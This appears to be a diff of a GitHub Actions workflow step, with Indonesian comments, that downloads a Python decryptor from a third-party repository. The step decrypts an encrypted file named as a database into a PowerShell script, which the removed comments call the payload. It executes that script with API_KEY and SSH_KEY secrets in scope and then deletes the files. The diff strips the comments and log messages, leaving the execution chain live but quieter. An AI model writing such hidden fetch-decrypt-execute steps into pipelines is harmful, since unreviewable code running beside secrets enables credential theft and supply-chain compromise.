@@ -29,38 +29,20 @@ jobs:
           API_KEY: ${{ secrets.API_KEY }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          # 1. Download script
           curl.exe -sL "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py" -o main.py
-  
-          # 2. Jalankan Dekripsi
-          # Kita gunakan nama file langsung tanpa Join-Path untuk mengurangi risiko error pathing
           if (Test-Path "database_i4x.dexenc") {
-              Write-Host "[+] Mendekripsi database_i4x.dexenc..." -ForegroundColor Cyan
-              
-              # Jalankan Python
               python main.py decrypt -i "database_i4x.dexenc" -key "$env:API_KEY" -o "database_i4x.ps1"
-              
-              # 3. Tunggu 1 detik agar file benar-benar terdaftar di OS
-              Start-Sleep -s 1
-  
+              #Start-Sleep -s 1
               if (Test-Path "database_i4x.ps1") {
-                  Write-Host "[+] File ditemukan! Menjalankan payload..." -ForegroundColor Green
-                  
-                  # Gunakan path lengkap untuk eksekusi agar tidak dianggap perintah tidak dikenal
                   $payloadPath = Resolve-Path "database_i4x.ps1"
                   . $payloadPath
-                  
-                  # Cleanup
                   Remove-Item "database_i4x.ps1", "main.py" -Force
               } else {
-                  # Cek isi folder untuk debugging jika masih gagal
-                  Write-Host "[-] Gagal: database_i4x.ps1 tidak ditemukan di folder berikut:" -ForegroundColor Red
                   Get-ChildItem
                   exit 1
               }
           } else {
-              Write-Host "[-] Gagal: database_i4x.dexenc tidak ditemukan!" -ForegroundColor Red
-              Get-ChildItem
+          Get-ChildItem
               exit 1
           }
           
